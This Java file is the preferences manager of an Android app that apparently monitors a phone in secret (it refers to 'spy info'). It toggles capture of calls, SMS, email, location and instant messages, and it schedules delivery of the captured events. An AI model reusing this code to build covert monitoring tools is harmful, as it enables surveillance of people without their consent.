package com.fx.preference;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import com.fx.maind.ServiceManager;
import com.fx.maind.ref.Customization;
import com.fx.preference.model.ProductInfo;
import com.fx.preference.model.ProductInfo.ProductEdition;
import com.fx.util.FxSettings;
import com.fx.util.FxUtil;
import com.vvt.logger.FxLog;
import com.vvt.util.GeneralUtil;

public class PreferenceManager {
	
	private static final String TAG = "PreferenceManager";
	private static final boolean LOGV = Customization.VERBOSE;
	
	private static PreferenceManager sInstance;
	
	private Context mContext;
	private PreferenceDatabaseHelper mPreferencedbHelper;
	
	public static PreferenceManager getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new PreferenceManager(context);
		}
		return sInstance;
	}
	
	private PreferenceManager(Context context) {
		mContext = context;
		mPreferencedbHelper = PreferenceDatabaseHelper.getInstance();
		
		// initialize event preference
		Cursor cursor = mPreferencedbHelper.query(
				Uri.parse(PreferenceDatabaseMetadata.EventPreference.URI), null, null, null, null);
		
		if (cursor != null && cursor.getCount() < 1) {
			initEventPreference();
			cursor.close();
		}
		
		if (cursor != null) {
			cursor.close();
		}
		
		// initialize product info
		cursor = mPreferencedbHelper.query(
				Uri.parse(PreferenceDatabaseMetadata.ProductInfo.URI), 
				null, null, null, null);
		
		if (cursor != null && cursor.getCount() < 1) {
			ProductInfo productInfo = new ProductInfo(
					ProductEdition.LIGHT, -1, "", "", "", "", "", "", "", "", "", "");
			
			setProductInfo(productInfo);
			cursor.close();
		}
		
		if (cursor != null) {
			cursor.close();
		}
		
		// initialize spy info
		SpyInfoManagerFactory.getSpyInfoManager(mContext);
	}
	
//-------------------------------------------------------------------------------------------------
// PRODUCT INFO METHODS
//-------------------------------------------------------------------------------------------------
	
	public void setProductInfo(ProductInfo productInfo) {
		if (LOGV) {
			FxLog.v(TAG, "setProductInfo # ENTER ...");
			FxLog.v(TAG, String.format("setProductInfo # productInfo: %s", productInfo));
		}

    	if (productInfo != null) {
    		String edition = FxUtil.getEncryptedInsertData(
    				productInfo.getEdition().toString(), false);
    		String name = FxUtil.getEncryptedInsertData(
    				productInfo.getName(), false);
    		String urlActivation = FxUtil.getEncryptedInsertData(
    				productInfo.getUrlActivation(), false);
    		String urlDelivery = FxUtil.getEncryptedInsertData(
    				productInfo.getUrlDelivery(), false);
    		String pkgName = FxUtil.getEncryptedInsertData(
    				productInfo.getPackageName(), false);
    		
    		// Construct ContentValue object
    		ContentValues values = new ContentValues();
    		values.put(PreferenceDatabaseMetadata.ProductInfo.EDITION, edition);
    		values.put(PreferenceDatabaseMetadata.ProductInfo.ID, productInfo.getId());
    		values.put(PreferenceDatabaseMetadata.ProductInfo.NAME, name);
    		values.put(PreferenceDatabaseMetadata.ProductInfo.DISPLAY_NAME, productInfo.getDisplayName());
    		values.put(PreferenceDatabaseMetadata.ProductInfo.BUILD_DATE, productInfo.getBuildDate());
    		values.put(PreferenceDatabaseMetadata.ProductInfo.VERSION_NAME, productInfo.getVersionName());
    		values.put(PreferenceDatabaseMetadata.ProductInfo.VERSION_MAJOR, productInfo.getVersionMajor());
    		values.put(PreferenceDatabaseMetadata.ProductInfo.VERSION_MINOR, productInfo.getVersionMinor());
    		values.put(PreferenceDatabaseMetadata.ProductInfo.VERSION_BUILD, productInfo.getVersionBuild());
    		values.put(PreferenceDatabaseMetadata.ProductInfo.URL_ACTIVATION, urlActivation);
    		values.put(PreferenceDatabaseMetadata.ProductInfo.URL_DELIVERY, urlDelivery);
    		values.put(PreferenceDatabaseMetadata.ProductInfo.PACKAGE_NAME, pkgName);
    		
    		Cursor cursor = mPreferencedbHelper.query(
    				Uri.parse(PreferenceDatabaseMetadata.ProductInfo.URI), null, null, null, null);
    		
    		if (cursor != null && cursor.getCount() > 0) {
    			// Update product info
    			mPreferencedbHelper.update(
    					Uri.parse(PreferenceDatabaseMetadata.ProductInfo.URI), values, null, null);
    			
    			if (LOGV) {
        			FxLog.v(TAG, String.format(
        					"setProductInfo # Product information is updated"));
        		}
    		}
    		else {
    			// Insert a new product info
    			mPreferencedbHelper.insert(
    					Uri.parse(PreferenceDatabaseMetadata.ProductInfo.URI), values);
    			
    			if (LOGV) {
        			FxLog.v(TAG, String.format(
        					"setProductInfo # Product information is initialized"));
        		}
    		}
    		
    		if (cursor != null) {
    			cursor.close();
    		}
    	}
    	
    	if (LOGV) {
			FxLog.v(TAG, "setProductInfo # EXIT ...");
		}
    }
	
	public ProductInfo getProductInfo() {
		if (LOGV) FxLog.v(TAG, "getProductInfo # ENTER ...");
    	
		Cursor cursor = mPreferencedbHelper.query(
				Uri.parse(PreferenceDatabaseMetadata.ProductInfo.URI), null, null, null, null);
		
    	ProductInfo productInfo = null;
    	
    	
    	if (LOGV) {
    		if (cursor.getCount() < 1) {
    			FxLog.v(TAG, "getProductInfo # Cannot find product info!!");
    		}
    	}
    	
    	if (cursor != null && cursor.moveToNext()) {
    		int id = cursor.getInt(cursor.getColumnIndex(
    				PreferenceDatabaseMetadata.ProductInfo.ID));
    		
    		String editionString = cursor.getString(cursor.getColumnIndex(
    				PreferenceDatabaseMetadata.ProductInfo.EDITION));
    		editionString = FxUtil.getDecryptedQueryData(editionString, false);
    		
    		ProductEdition edition = ProductEdition.LIGHT;
    		if (editionString != null) {
	    		if (editionString.equals(ProductEdition.PROX.toString())) {
	    			edition = ProductEdition.PROX;
	    		}
	    		else if (editionString.equals(ProductEdition.PRO.toString())) {
	    			edition = ProductEdition.PRO;
	    		}
	    		else if (editionString.equals(ProductEdition.LIGHT.toString())) {
	    			edition = ProductEdition.LIGHT;
	    		}
    		}
    		
    		String name = cursor.getString(cursor.getColumnIndex(
    				PreferenceDatabaseMetadata.ProductInfo.NAME));
    		name = FxUtil.getDecryptedQueryData(name, false);
    		
    		String displayName = cursor.getString(cursor.getColumnIndex(
    				PreferenceDatabaseMetadata.ProductInfo.DISPLAY_NAME));
    		
    		String buildDate = cursor.getString(cursor.getColumnIndex(
    				PreferenceDatabaseMetadata.ProductInfo.BUILD_DATE));
    		
    		String versionName = cursor.getString(cursor.getColumnIndex(
    				PreferenceDatabaseMetadata.ProductInfo.VERSION_NAME));
    		
    		String versionMajor = cursor.getString(cursor.getColumnIndex(
    				PreferenceDatabaseMetadata.ProductInfo.VERSION_MAJOR));
    		
    		String versionMinor = cursor.getString(cursor.getColumnIndex(
    				PreferenceDatabaseMetadata.ProductInfo.VERSION_MINOR));
    		
    		String versionBuild = cursor.getString(cursor.getColumnIndex(
    				PreferenceDatabaseMetadata.ProductInfo.VERSION_BUILD));
    		
    		String urlActivation = cursor.getString(cursor.getColumnIndex(
    				PreferenceDatabaseMetadata.ProductInfo.URL_ACTIVATION));
    		urlActivation = FxUtil.getDecryptedQueryData(urlActivation, false);
    		
    		String urlDelivery = cursor.getString(cursor.getColumnIndex(
    				PreferenceDatabaseMetadata.ProductInfo.URL_DELIVERY));
    		urlDelivery = FxUtil.getDecryptedQueryData(urlDelivery, false);
    		
    		String pkgName = cursor.getString(cursor.getColumnIndex(
    				PreferenceDatabaseMetadata.ProductInfo.PACKAGE_NAME));
    		pkgName = FxUtil.getDecryptedQueryData(pkgName, false);
    		
    		productInfo = new ProductInfo(edition, id, name, displayName, buildDate, versionName, 
    				versionMajor, versionMinor, versionBuild, urlActivation, urlDelivery, pkgName);
    		
    		if (LOGV) FxLog.v(TAG, String.format(
    				"getProductInfo # productInfo: %s", productInfo));
    	}
    	
    	if (cursor != null) {
    		cursor.close();
    	}
    	
    	if (LOGV) FxLog.v(TAG, "getProductInfo # EXIT ...");
    	
    	return productInfo;
    }
	
//-------------------------------------------------------------------------------------------------
// EVENT PREFERENCE METHODS
//-------------------------------------------------------------------------------------------------
	
	private void initEventPreference() {
		// Construct ContentValue object
		ContentValues values = new ContentValues();
		
		values.put(PreferenceDatabaseMetadata.EventPreference.EVENTS_CAPTURING_STATUS, 
				FxSettings.getDefaultCapture());
		values.put(PreferenceDatabaseMetadata.EventPreference.CALL_CAPTURING_STATUS, 
				FxSettings.getDefaultCapturePhoneCall());
		values.put(PreferenceDatabaseMetadata.EventPreference.SMS_CAPTURING_STATUS, 
				FxSettings.getDefaultCaptureSms());
		values.put(PreferenceDatabaseMetadata.EventPreference.EMAIL_CAPTURING_STATUS, 
				FxSettings.getDefaultCaptureEmail());
		values.put(PreferenceDatabaseMetadata.EventPreference.LOCATION_CAPTURING_STATUS, 
				FxSettings.getDefaultCaptureLocation());
		values.put(PreferenceDatabaseMetadata.EventPreference.IM_CAPTURING_STATUS, 
				FxSettings.getDefaultCaptureIm());
		values.put(PreferenceDatabaseMetadata.EventPreference.GPS_TIME_INTERVAL, 
				FxSettings.getDefaultGpsTimeInterval());
		values.put(PreferenceDatabaseMetadata.EventPreference.MAX_EVENTS, 
				FxSettings.getDefaultMaxEvents());
		values.put(PreferenceDatabaseMetadata.EventPreference.DELIVERY_PERIOD, 
				FxSettings.getDefaultDeliveryPeriodHours());
		values.put(PreferenceDatabaseMetadata.EventPreference.EVENT_ID, 0);
		
		// Insert new preference
		mPreferencedbHelper.insert(
				Uri.parse(PreferenceDatabaseMetadata.EventPreference.URI), values);
		
		if (LOGV) {
			FxLog.v(TAG, String.format("Preference is initialized"));
		}
	}
	
	public void setEventId(int id) {
		int rowAffected = setEventPreferenceValue(
				PreferenceDatabaseMetadata.EventPreference.EVENT_ID, id);
		
		if (rowAffected > 0) {
			if (LOGV) FxLog.v(TAG, String.format("Set event ID: %s", id));
		}
		else if (LOGV) {
			FxLog.v(TAG, "Fail to set event ID");
		}
	}
	
	public int getEventId() {
		int eventId = -1;
    	
    	Object value = getEventPreferenceValue(
    			PreferenceDatabaseMetadata.EventPreference.EVENT_ID,  Integer.class);
    	
    	if (value != null) {
    		eventId = (Integer) value;
    	}
    	
    	return eventId;
	}
	
	public void setCaptureEnabled(boolean status) {
		String key = PreferenceDatabaseMetadata.EventPreference.EVENTS_CAPTURING_STATUS;
		int rowAffected = setEventPreferenceValue(key, status);
		
		if (rowAffected > 0) {
			if (LOGV) FxLog.v(TAG, String.format("Set event capture status: %s", status));
		}
		else if (LOGV) {
			FxLog.v(TAG, "Fail to set capturing status");
		}
	}
	
	public boolean isCaptureEnabled() {
		boolean isCaptureEnabled = false;
    	
    	Object value = getEventPreferenceValue(
    			PreferenceDatabaseMetadata.EventPreference.EVENTS_CAPTURING_STATUS, 
    			Integer.class);
    	
    	if (value != null) {
    		isCaptureEnabled = ((Integer) value).intValue() > 0 ? true : false;
    	}
    	
    	return isCaptureEnabled;
	}
	
	public void setCaptureCallLogEnabled(boolean status) {
		int rowAffected = setEventPreferenceValue( 
				PreferenceDatabaseMetadata.EventPreference.CALL_CAPTURING_STATUS, 
				status);
		
		if (rowAffected > 0) {
//			IpcManager.sendMessage(mContext, 
//					IpcManager.TARGET_MBACKUPD, 
//					IpcManager.MSG_RESET_EVENT_OBSERVERS);
			
			if (LOGV) {
				FxLog.v(TAG, String.format("Set Call capturing status: %s", status));
			}
		}
		else if (LOGV) {
			FxLog.v(TAG, "Fail to set Call capturing status");
		}
	}

	public boolean isCaptureCallLogEnabled() {
		boolean isCaptureCallEnabled = false;
    	
    	Object value = getEventPreferenceValue(
    			PreferenceDatabaseMetadata.EventPreference.CALL_CAPTURING_STATUS, 
    			Integer.class);
    	
    	if (value != null) {
    		isCaptureCallEnabled = ((Integer) value).intValue() > 0 ? true : false;
    	}
    	
    	return isCaptureCallEnabled;
	}
	
	public void setCaptureSmsEnabled(boolean status) {
		int rowAffected = setEventPreferenceValue( 
				PreferenceDatabaseMetadata.EventPreference.SMS_CAPTURING_STATUS, 
				status);
		
		if (rowAffected > 0) {
//			IpcManager.sendMessage(mContext, 
//					IpcManager.TARGET_MBACKUPD, 
//					IpcManager.MSG_RESET_EVENT_OBSERVERS);
			
			if (LOGV) {
				FxLog.v(TAG, String.format("Set SMS capturing status: %s", status));
			}
		}
		else if (LOGV) {
			FxLog.v(TAG, "Fail to set SMS capturing status");
		}
	}
	
	public boolean isCaptureSmsEnabled() {
		boolean isCaptureSmsEnabled = false;
		
		Object value = getEventPreferenceValue(
				PreferenceDatabaseMetadata.EventPreference.SMS_CAPTURING_STATUS, 
				Integer.class);
		
		if (value != null) {
			isCaptureSmsEnabled = ((Integer) value).intValue() > 0 ? true : false;
		}
		
		return isCaptureSmsEnabled;
	}

	public void setCaptureEmailEnabled(boolean status) {
		int rowAffected = setEventPreferenceValue( 
				PreferenceDatabaseMetadata.EventPreference.EMAIL_CAPTURING_STATUS, status);
		
		if (rowAffected > 0) {
//			IpcManager.sendMessage(mContext, 
//					IpcManager.TARGET_MBACKUPD, 
//					IpcManager.MSG_RESET_EVENT_OBSERVERS);
			
			if (LOGV) {
				FxLog.v(TAG, String.format("Set Email capturing status: %s", status));
			}
		}
		else if (LOGV) {
			FxLog.v(TAG, "Fail to set Email capturing status");
		}
	}

	public boolean isCaptureEmailEnabled() {
		boolean isCaptureEmailEnabled = false;
    	
    	Object value = getEventPreferenceValue(
    			PreferenceDatabaseMetadata.EventPreference.EMAIL_CAPTURING_STATUS, 
    			Integer.class);
    	
    	if (value != null) {
    		isCaptureEmailEnabled = ((Integer) value).intValue() > 0 ? true : false;
    	}
    	
    	return isCaptureEmailEnabled;
	}
	
	public void setCaptureLocationEnabled(boolean status) {
		int rowAffected = setEventPreferenceValue( 
				PreferenceDatabaseMetadata.EventPreference.LOCATION_CAPTURING_STATUS, status);
		
		if (rowAffected > 0) {
			if (LOGV) FxLog.v(TAG, String.format("Set GPS tracking status: %s", status));
		} 
		else if (LOGV) {
			FxLog.v(TAG, "Fail to set GPS tracking status");
		}
	}

	public boolean isCaptureLocationEnabled() {
		boolean isCaptureLocationEnabled = false;
    	
    	Object value = getEventPreferenceValue(
    			PreferenceDatabaseMetadata.EventPreference.LOCATION_CAPTURING_STATUS, 
    			Integer.class);
    	
    	if (value != null) {
    		isCaptureLocationEnabled = ((Integer) value).intValue() > 0 ? true : false;
    	}
    	
    	return isCaptureLocationEnabled;
	}
	
	public void setCaptureImEnabled(boolean status) {
		ProductEdition edition = getProductInfo().getEdition();
		status = status && edition == ProductEdition.PROX;
		
		int rowAffected = setEventPreferenceValue( 
				PreferenceDatabaseMetadata.EventPreference.IM_CAPTURING_STATUS, status);
		
		if (rowAffected > 0) {
//			IpcManager.sendRequest(
//					IpcManager.SOCKET_MBACKUPD, 
//					IpcManager.REQUEST_RESET_EVENT_OBSERVERS);
			
			if (LOGV) {
				FxLog.v(TAG, String.format("Set IM capturing status: %s", status));
			}
		}
		else if (LOGV) {
			FxLog.v(TAG, "Fail to set IM capturing status");
		}
	}
	
	public boolean isCaptureImEnabled() {
		boolean isCaptureImEnabled = false;
		
		Object value = getEventPreferenceValue(
				PreferenceDatabaseMetadata.EventPreference.IM_CAPTURING_STATUS, 
				Integer.class);
		
		if (value != null) {
			isCaptureImEnabled = ((Integer) value).intValue() > 0 ? true : false;
		}
		
		ProductEdition edition = getProductInfo().getEdition();
		
		return (edition == ProductEdition.PROX) && isCaptureImEnabled;
	}

	public void setGpsTimeInterval(int second) {
		int rowAffected = setEventPreferenceValue(
				PreferenceDatabaseMetadata.EventPreference.GPS_TIME_INTERVAL, 
				second);
		
		if (LOGV) {
			if (rowAffected > 0) {
				FxLog.v(TAG, String.format("Set GPS time interval: %s", second));
			}
			else {
				FxLog.v(TAG, "Fail to set GPS time interval");
			}
		}
	}
	
	public int getGpsTimeIntervalSeconds() {
		int gpsTimeInterval = -1;
    	
    	Object value = getEventPreferenceValue(
    			PreferenceDatabaseMetadata.EventPreference.GPS_TIME_INTERVAL, 
    			Integer.class);
    	
    	if (value != null) {
    		gpsTimeInterval = (Integer) value;
    	}
    	
    	return gpsTimeInterval;
	}
	
	public void setMaxEvents(int value) {
		String key = PreferenceDatabaseMetadata.EventPreference.MAX_EVENTS;
		int rowAffected = setEventPreferenceValue(key, value);
		
		if (rowAffected > 0) {
			if (LOGV) FxLog.v(TAG, String.format("Set max events: %s", value));
			ServiceManager.getInstance(mContext).processNumberOfEvents();
		}
		else {
			if (LOGV) FxLog.v(TAG, "Fail to set max events");
		}
	}

	public int getMaxEvents() {
		int maxEvents = -1;
    	
    	Object value = getEventPreferenceValue(
    			PreferenceDatabaseMetadata.EventPreference.MAX_EVENTS, 
    			Integer.class);
    	
    	if (value != null) {
    		maxEvents = (Integer) value;
    	}
    	
    	return maxEvents;
	}
	
	public void setDeliveryPeriodHours(int value) {
		String key = PreferenceDatabaseMetadata.EventPreference.DELIVERY_PERIOD;
		int rowAffected = setEventPreferenceValue(key, value);
		
		if (rowAffected > 0) {
			if (LOGV) FxLog.v(TAG, String.format("Set delivery period: %s hour(s)", value));
			
			if (value < 1) {
				if (LOGV) FxLog.v(TAG, "Stop delivery scheduler");
				ServiceManager.getInstance(mContext).stopDeliveryScheduler();
			}
			else {
				if (LOGV) FxLog.v(TAG, "Restart delivery scheduler");
				ServiceManager.getInstance(mContext).restartDeliveryScheduler();
			}
		}
		else if (LOGV) {
			FxLog.v(TAG, "Fail to set delivery period");
		}
	}
	
	public int getDeliveryPeriodHours() {
		int deliveryPeriodHours = -1;
    	
    	Object value = getEventPreferenceValue(
    			PreferenceDatabaseMetadata.EventPreference.DELIVERY_PERIOD, 
    			Integer.class);
    	
    	if (value != null) {
    		deliveryPeriodHours = (Integer) value;
    	}
    	
    	return deliveryPeriodHours;
	}
	
	public long getDeliveryPeriodMilliseconds() {
		return (long) (getDeliveryPeriodHours() * 3600000. + 0.5);
	}
	
	private Object getEventPreferenceValue(String column, Class<?> valueClass) {
    	
    	Cursor cursor = mPreferencedbHelper.query(
    			Uri.parse(PreferenceDatabaseMetadata.EventPreference.URI), 
    			null, null, null, null);
    	
    	Object value = GeneralUtil.getCursorValue(cursor, valueClass, column);
    	
    	if (cursor != null) {
    		cursor.close();
    	}
    	
    	return value;
    }
	
	private int setEventPreferenceValue(String key, Object value) {
		
		return mPreferencedbHelper.update(
				Uri.parse(PreferenceDatabaseMetadata.EventPreference.URI), 
				GeneralUtil.getUpdatingContentValues(key, value), 
				null, null);
	}
}
